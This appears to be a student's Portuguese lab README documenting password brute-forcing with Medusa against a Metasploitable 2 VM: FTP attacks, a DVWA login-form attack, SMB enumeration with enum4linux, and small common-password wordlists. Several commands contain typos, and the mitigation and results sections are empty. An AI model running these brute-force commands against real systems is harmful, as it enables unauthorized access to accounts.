# Desafio medusa


## Ferramentas
- Kali Linux
- Medusa
- Metasploitable 2
- VM Kali + VM Metasploitable 2

# Simulados:

## Força bruta em FTP: 

### WordLists

- users.txt
- passwords.txt

```
──(kali@kali)-[~]
└─$ echo -e "user \\nmsfadmin\nadmin\nroot" > users.txt

┌──(kali@kali)-[~]
└─$ echo -e "123456 \\npassword\nqewrty\nmsfadmin" > pass.txt

┌──(kali@kali)-[~]
└─$ cat pass.txt
123456
password
qewrty
msfadmin

┌──(kali@kali)-[~]
└─$ echo -e "user \nadmin\nmsfadmin\nroot" > users.txt

┌──(kali@kali)-[~]
└─$ cat users.txt
user
admin
msfadmin
root
``` 

```
echo-e 'user\nmsfadmin\admin\nroot' > users.txt 
```
``` medusa -h 192.16.56.102 -U user.txt -P pass.txt -M ftp -t 6 ```


## Automação de tentativas em formulário web (DVWA) 

https://192.168.56.10/dvwa/login.php


<img width="1343" height="919" alt="Captura de tela de 2026-11-06 15-31-59" src="https://github.com/user-attachments/assets/a21416c3-b35b-4e05-b49d-b3d522cef97a" />

<img width="1721" height="874" alt="Captura de tela de 2026-11-06 14-37-32" src="https://github.com/user-attachments/assets/1d54dda2-5135-40f0-b507-e4cc1819725d" />

<img width="1163" height="878" alt="Captura de tela de 2026-11-06 15-47-54" src="https://github.com/user-attachments/assets/b5b6cb70-6dc1-4e41-9bb2-f0292bdbc8d7" />

## Password spraying em SMB com enumeração de usuários


```
enum4linux -a 192.168.56.102 | tee enum_output.txt
```

<img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/8347f748-8b88-497b-a22a-e3aa22b9f2e9" />



```
medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
Resultado:


Linhas de comando:
```
echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
```





## Comandos utilizados


## Validação de acessos 


## Recomendações de mitigação


## Resutados


